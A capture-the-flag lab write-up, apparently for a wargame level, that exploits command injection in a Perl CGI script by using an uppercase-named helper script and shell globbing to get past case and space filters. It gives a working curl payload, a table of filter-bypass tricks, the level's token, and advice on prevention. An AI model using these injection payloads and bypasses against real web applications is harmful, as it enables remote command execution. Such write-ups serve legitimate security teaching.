# Level 12 - Perl CGI with Uppercase Filter Bypass

## 🎯 Objective
Bypass input filtering to inject commands into a Perl CGI script.

## 🧠 My Thought Process

### Step 1: "Another CGI script"
```bash
cat level12.pl
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;     # Convert to UPPERCASE!
  $xx =~ s/\s.*//;         # Remove everything after first space
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  # ... rest of function
}

sub n {
  # ... output handling
}

n(t(param("x"), param("y")));
```

### Step 2: "Identifying the vulnerability and filters"

**The vulnerability:** Parameter goes into backticks!
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

**But there are filters:**
1. `tr/a-z/A-Z/` - Converts all lowercase to UPPERCASE
2. `s/\s.*//` - Removes spaces and everything after

**The challenge:** How do I inject commands when:
- All letters become uppercase
- No spaces allowed

### Step 3: "Thinking about the constraints"

If I try:
- `$(getflag)` → becomes `$(GETFLAG)` → "GETFLAG: command not found"
- `;ls -la` → becomes `;LS -LA` → "LS: command not found"

**Key insight:** Shell commands are case-sensitive! `getflag` ≠ `GETFLAG`

### Step 4: "The bypass strategy"

I need to call a script/binary that:
1. Works when the name is UPPERCASE
2. Can execute arbitrary code

**Solution:** Create my own script with an UPPERCASE name!

```bash
# Create a script in /tmp named GETFLAG (already uppercase!)
echo '#!/bin/bash' > /tmp/GETFLAG
echo 'getflag > /tmp/flag12' >> /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```

### Step 5: "Calling my script"

Now I need to execute `/tmp/GETFLAG` through the injection.

**Problem:** `/tmp/GETFLAG` has lowercase letters in the path!
- `/tmp/` → `/TMP/` → Directory doesn't exist!

**Solution:** Use shell globbing with wildcards!

Wildcards like `*` are NOT affected by `tr/a-z/A-Z/`:
- `/*/GETFLAG` → `/*/GETFLAG` (unchanged)
- Shell expands `/*` to match `/tmp` (among others)

### Step 6: "Crafting the final payload"

URL parameter:
```
x=`/*/GETFLAG`
```

After uppercase conversion:
```
x=`/*/GETFLAG`  (backticks and wildcards unchanged!)
```

The egrep command becomes:
```bash
egrep "^`/*/GETFLAG`" /tmp/xd 2>&1
```

Shell expands `/*/GETFLAG` to `/tmp/GETFLAG` and executes it!

### Step 7: "Execute the exploit"
```bash
# Create the uppercase script
echo '#!/bin/bash' > /tmp/GETFLAG
echo 'getflag > /tmp/flag12' >> /tmp/GETFLAG
chmod +x /tmp/GETFLAG

# Trigger via CGI
curl "http://127.0.0.1:4646/level12.pl?x=\`/*/GETFLAG\`"

# Read result
cat /tmp/flag12
```

## ✅ Solution
```bash
# Create uppercase exploit script
echo '#!/bin/bash' > /tmp/GETFLAG
echo 'getflag > /tmp/flag12' >> /tmp/GETFLAG
chmod +x /tmp/GETFLAG

# Trigger the CGI (note: backticks need escaping in curl)
curl "http://127.0.0.1:4646/level12.pl?x=%60/*/GETFLAG%60"

# Read the flag
cat /tmp/flag12
```

**Token:** `g1qKMiRpXf53AWhDaU7FEkczr`

## 📚 Concepts to Learn

### 1. Input Filter Bypass
When applications filter input, look for:
- What characters/patterns ARE allowed
- Alternative representations
- Encoding tricks
- Logic flaws in filter order

| Filter | Bypass |
|--------|--------|
| Uppercase conversion | Use uppercase names, numbers, symbols |
| Space removal | Use `$IFS`, `{,}`, tabs, `%09` |
| Blacklist words | Encoding, concatenation, wildcards |

### 2. Perl tr/// Operator
```perl
$string =~ tr/a-z/A-Z/;
```

Translates characters:
- Only affects a-z (lowercase letters)
- Leaves uppercase, numbers, symbols UNCHANGED
- `*`, `/`, `` ` `` are not modified!

### 3. Shell Globbing (Wildcards)
| Pattern | Matches |
|---------|---------|
| `*` | Any characters (any length) |
| `?` | Any single character |
| `[abc]` | a, b, or c |
| `[0-9]` | Any digit |

```bash
/*/GETFLAG    # Matches /tmp/GETFLAG, /var/GETFLAG, etc.
/???/GETFLAG  # Matches /tmp/GETFLAG (3-letter dir)
```

### 4. The Filter Analysis

| Character | After tr/a-z/A-Z/ | After s/\s.*// |
|-----------|-------------------|----------------|
| `getflag` | `GETFLAG` | `GETFLAG` |
| `/tmp/a` | `/TMP/A` | `/TMP/A` |
| `/*/GETFLAG` | `/*/GETFLAG` | `/*/GETFLAG` |
| `` `cmd` `` | `` `CMD` `` | `` `CMD` `` |
| `a b` | `A B` | `A` (space removes rest) |

### 5. The Execution Chain
```
Input: x=`/*/GETFLAG`

Step 1: CGI receives parameter
        $xx = "`/*/GETFLAG`"

Step 2: tr/a-z/A-Z/ applied
        $xx = "`/*/GETFLAG`"  (no lowercase to convert!)

Step 3: s/\s.*// applied
        $xx = "`/*/GETFLAG`"  (no spaces!)

Step 4: Command constructed
        `egrep "^`/*/GETFLAG`" /tmp/xd 2>&1`

Step 5: Shell processes backticks
        - Inner backticks execute first
        - /*/GETFLAG expands to /tmp/GETFLAG
        - /tmp/GETFLAG runs (our script!)
        - getflag > /tmp/flag12
```

### 6. Alternative Bypass: Using $()
```bash
# Backticks and $() are equivalent
`command`
$(command)

# Our payload could also be:
x=$(/*/GETFLAG)
```

## 🔧 Tools Used
- `echo` - Create exploit script
- `chmod` - Make script executable
- `curl` - Send HTTP request
- Understanding of Perl regex and shell

## 🛡️ How to Prevent This
1. **Don't use backticks/system() with user input:**
   ```perl
   # NEVER do this
   `command $user_input`
   
   # Use Safe module or parameterized commands
   ```

2. **Whitelist, don't blacklist:**
   ```perl
   # Only allow expected characters
   if ($input !~ /^[a-zA-Z0-9]+$/) {
       die "Invalid input";
   }
   ```

3. **Quote properly:**
   ```perl
   # Use quotemeta() for regex escaping
   my $safe = quotemeta($input);
   ```

4. **Avoid shell entirely:**
   ```perl
   # Instead of backticks, use Perl's native functions
   open(my $fh, "<", "/tmp/xd");
   my @lines = grep { /^$pattern/ } <$fh>;
   ```

5. **Filter AFTER normalization:**
   ```perl
   # Apply filters in correct order
   $input = uc($input);        # Normalize first
   $input =~ s/[^A-Z]//g;      # Then strict whitelist
   ```

